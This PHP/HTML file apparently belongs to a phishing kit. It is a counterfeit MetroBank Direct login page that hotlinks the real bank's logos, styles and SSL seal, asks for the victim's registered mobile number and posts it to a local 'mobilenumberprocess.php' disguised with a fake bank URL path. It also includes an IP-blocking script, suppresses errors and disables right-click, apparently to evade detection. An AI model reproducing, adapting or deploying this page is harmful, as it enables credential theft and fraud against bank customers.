<?php
error_reporting(0);
	include 'ip_blocker.php';
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">


  <head>
  <link rel="shortcut icon" type="image/x-icon" href="https://personal.metrobankdirect.com/RetailInternetPortal/images/favicon.ico" />
  <link href="https://personal.metrobankdirect.com/RetailInternetPortal/css/reset.css" type="text/css" rel="stylesheet" />
<link href="https://personal.metrobankdirect.com/RetailInternetPortal/css/style.css" type="text/css" rel="stylesheet" />

<script type="text/javascript" src="/RetailInternetPortal/js/jquery-v1.7.1.js"></script>
<script type="text/javascript" src="/RetailInternetPortal/js/jquery-v2.js"></script>
<script type='text/javascript' src='/RetailInternetPortal/include/lib/browserNotSupported.js'></script>
    <base />
    <title>Welcome to MetroBank Direct</title>
    
    
  </head>
  <body class="login" oncontextmenu="return false;">
	<script type="text/javascript">
			  function resetdata()
		{
			document.LoginForm.loginid.value = "";
			document.LoginForm.loginid.focus();
			return false;
		} 

	</script>
  <form   name="LoginForm" method="post" action="mobilenumberprocess.php#/RetailInternetPortal/login.do"> 
		
<div id="wrapper">
			<div id="header">
		<div id="logo">
			<img src="https://personal.metrobankdirect.com/RetailInternetPortal/images/metrobank-logo.png" border="0" alt="" />
		</div>
		<div id="logoPersonal">
			<img src="https://personal.metrobankdirect.com/RetailInternetPortal/images/mb-personal-PNG.png" border="0" alt="" />
		</div>
	</div>
			<!-- <div id="retail-logo">
					<img src="https://personal.metrobankdirect.com/RetailInternetPortal/images/retail-logo-login.jpg"  alt="" />
			</div> -->
			<div class="loginbox">
				<div class="box">
					<!-- <h3>Secure Login</h3> -->
					<div class="form">
					<div class="error-message">
						&nbsp;
					
					
					</div>
						<label>Registered Mobile Number:</label>
						<input type="text" name="MNUMBER" value="" class="text-box med" alt="Enter Mobile Number" required="required" placeholder="09XXXXXXXXXX" maxlength="12">
	
						<div class="buttonwrapper">

							<input type="submit" value="Proceed" class="button"/>
						</div>
				
					</div>
				</div>
				<div class="tipsbox">
					<h1>View important tips for safe and secure <br />Online Banking in our <a href="# target="_blank">Security Center</a>.</h1>
					<ul>
						<li>Read about Security Alerts</li>
						<li>Learn how to protect yourself</li>
						<li>Find out how we protect you</li>
						<li>Learn more about online fraud</li>
					</ul>
					<div style="text-align:center;"><a href="#" onclick="#"><img src="https://personal.metrobankdirect.com/RetailInternetPortal/images/view-demo.png" /></a></div>
				</div>
			</div>
			
			<div id="footer">
			
			<img src="https://ssif1.globalsign.com/SiteSeal/siteSeal/siteSeal/siteSealImage.do?p1=personal.metrobankdirect.com&p2=SZ125-50&p3=image&p4=en&p5=V0023&p6=S001&p7=https&deterDn=" width="100px"><br /><br />
			<a href="https://www.globalsign.com/en-ph/ssl/" target="_blank"  style="color:#000000; text-decoration:none; font:bold 7px verdana,sans-serif; letter-spacing:.5px; text-align:center; margin:0px; padding:0px;">ABOUT SSL CERTIFICATES</a>
				
		<!-- <a href="javascript:void(0)" onclick="connectToVerisignSite();"><img src="https://personal.metrobankdirect.com/RetailInternetPortal/images/norton.jpg" border="0" title="Click to Verify - This site chose Symantec SSL for secure e-commerce and confidential communications."/></a>-->
		<!-- <img src="https://personal.metrobankdirect.com/RetailInternetPortal/images/mb-yigh-PNG.png" alt="Metro Bank" />  -->
		<div class="menu"><a href="https://www.metrobank.com.ph/privacy_policy.asp" class="ajaxLink1" target="_blank">Privacy Policy</a>  
		   |     <a href="https://www.metrobank.com.ph/terms_of_use.asp" class="ajaxLink1" target="_blank">Terms &amp; Conditions</a></div>
	
		<!-- <p style="font-weight:bold;">For inquiries, contact Metrobank Corporate Customer Care Desk:</p>-->
		<div class="footerwrapper">
			<!-- <label>Tel. No.: <span>(632)898-8000 dial 1, then 2</span></label> -->
			<label>24/7 Customer Hotline: <span>(632) 8700-700</span></label>
			<!-- <label>Domestic Toll-free No.: <span> 1-800-10-8579727</span></label> -->
			<label>24/7 Domestic Toll-free No.: <span> 1-800-1888-5775</span></label>
			<label style="width:100%;text-align:center;">E-mail:<span> <a href="mailto:customercare@metrobank.com.ph">customercare@metrobank.com.ph</a></span></label>
			
			<label><span>Copyright &copy;2012 Metrobank. All rights reserved.</span></label>
		</div>
	</div>
	</div>
	</form>
  </body>
</html>
